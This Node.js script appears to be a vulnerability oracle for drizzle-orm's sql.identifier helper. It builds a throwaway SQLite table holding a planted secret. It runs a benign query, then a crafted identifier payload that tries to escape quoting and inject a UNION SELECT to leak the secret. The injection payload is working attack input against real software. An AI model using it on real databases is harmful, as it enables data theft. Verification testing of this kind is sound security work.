'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function main() {
  const result = { operation_completed: false, exploit_succeeded: false, evidence: '' };
  try {
    const marker = 'drizzle_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
    const tmpDir = os.tmpdir();
    const markerPath = path.join(tmpDir, marker);

    let sqliteCore;
    try {
      sqliteCore = require('drizzle-orm/sqlite-core');
    } catch (e) {
      console.log('SETUP_ERROR module-resolution: ' + e.message);
      console.log('ORACLE_RESULT ' + JSON.stringify(result));
      return;
    }

    const { sqliteTable, text, integer } = sqliteCore;

    let Database;
    try {
      Database = require('better-sqlite3');
    } catch (e) {
      console.log('SETUP_ERROR missing-driver: ' + e.message);
      console.log('ORACLE_RESULT ' + JSON.stringify(result));
      return;
    }

    let drizzleFn;
    try {
      drizzleFn = require('drizzle-orm/better-sqlite3').drizzle;
    } catch (e) {
      console.log('SETUP_ERROR drizzle-driver-load: ' + e.message);
      console.log('ORACLE_RESULT ' + JSON.stringify(result));
      return;
    }

    const dbFile = path.join(tmpDir, marker + '.sqlite3');
    let sqlite;
    try {
      sqlite = new Database(dbFile);
      sqlite.exec(`CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, secret TEXT)`);
      sqlite.exec(`INSERT INTO users (id, name, secret) VALUES (1, 'alice', 'TOP_SECRET_VALUE')`);
    } catch (e) {
      console.log('SETUP_ERROR sqlite-init: ' + e.message);
      console.log('ORACLE_RESULT ' + JSON.stringify(result));
      return;
    }

    const db = drizzleFn(sqlite);

    // Benign operation: use a normal, safe identifier via sql.identifier-like usage.
    // We exercise the public API surface that builds identifier/column references,
    // specifically the `sql` template tag combined with an identifier helper,
    // which is the code path affected by improper escaping of SQL identifiers.
    let sqlModule;
    try {
      sqlModule = require('drizzle-orm');
    } catch (e) {
      console.log('SETUP_ERROR core-module: ' + e.message);
      console.log('ORACLE_RESULT ' + JSON.stringify(result));
      return;
    }

    const { sql } = sqlModule;

    // Benign: query using a safe, ordinary column name wrapped via sql.identifier
    let benignOk = false;
    try {
      const benignIdent = 'name';
      const query = sql`SELECT ${sql.identifier(benignIdent)} FROM users WHERE id = 1`;
      const stmt = db.all(query);
      if (Array.isArray(stmt) && stmt.length === 1 && stmt[0].name === 'alice') {
        benignOk = true;
      }
    } catch (e) {
      console.log('BENIGN_OPERATION_ERROR: ' + e.message);
      console.log('ORACLE_RESULT ' + JSON.stringify(result));
      return;
    }

    if (!benignOk) {
      console.log('BENIGN_OPERATION_FAILED: unexpected result shape');
      console.log('ORACLE_RESULT ' + JSON.stringify(result));
      return;
    }

    // Only now may operation_completed become true, since benign call succeeded.
    result.operation_completed = true;

    // Malicious input: an identifier string crafted to break out of the
    // quoting/escaping performed by sql.identifier(), attempting to inject
    // additional SQL. In vulnerable versions, the identifier escaping fails
    // to properly quote special characters (e.g., embedded quote + semicolon),
    // allowing the attacker-controlled string to inject a UNION-based read of
    // a value that should not be reachable from this query context, or to
    // alter the executed SQL in an unexpected way. We verify exploitation by
    // checking whether the secret column value leaks through a column that
    // should only ever return the (safe) 'name' field for id=1, i.e. the
    // injected identifier caused extra SQL to execute that exposes `secret`.
    const maliciousIdent = 'name" FROM users WHERE id=1 UNION SELECT secret -- ';

    let exploitSucceeded = false;
    let evidence = '';
    try {
      const maliciousQuery = sql`SELECT ${sql.identifier(maliciousIdent)} FROM users WHERE id = 1`;
      const rows = db.all(maliciousQuery);
      // If the identifier was NOT properly escaped, the crafted payload would
      // either (a) execute successfully and return the secret value through
      // the injected UNION SELECT secret, or (b) alter query semantics to leak
      // unintended data. We check for leakage of the secret value.
      const leaked = Array.isArray(rows) && rows.some(r => {
        const vals = Object.values(r);
        return vals.includes('TOP_SECRET_VALUE');
      });
      if (leaked) {
        exploitSucceeded = true;
        evidence = 'Malicious identifier injected extra SQL and leaked secret value via improperly escaped identifier.';
      } else {
        evidence = 'Malicious identifier query executed but did not leak secret value; identifier appears properly escaped.';
      }
    } catch (e) {
      // A patched version should throw or safely quote the identifier so that
      // the injected SQL becomes part of a harmless, syntactically-invalid or
      // inert identifier string, causing a SQL syntax error (rejected safely)
      // rather than executing injected SQL. This counts as blocked.
      exploitSucceeded = false;
      evidence = 'Malicious identifier was rejected/blocked (exception): ' + e.message;
    }

    result.exploit_succeeded = exploitSucceeded;
    result.evidence = evidence;

    try { sqlite.close(); } catch (_) {}
    try { if (fs.existsSync(dbFile)) fs.unlinkSync(dbFile); } catch (_) {}
    try { if (fs.existsSync(markerPath)) fs.unlinkSync(markerPath); } catch (_) {}

    console.log('ORACLE_RESULT ' + JSON.stringify(result));
  } catch (e) {
    const failResult = { operation_completed: false, exploit_succeeded: false, evidence: 'Unexpected top-level exception: ' + (e && e.message ? e.message : String(e)) };
    console.log('ORACLE_RESULT ' + JSON.stringify(failResult));
  }
}

main();
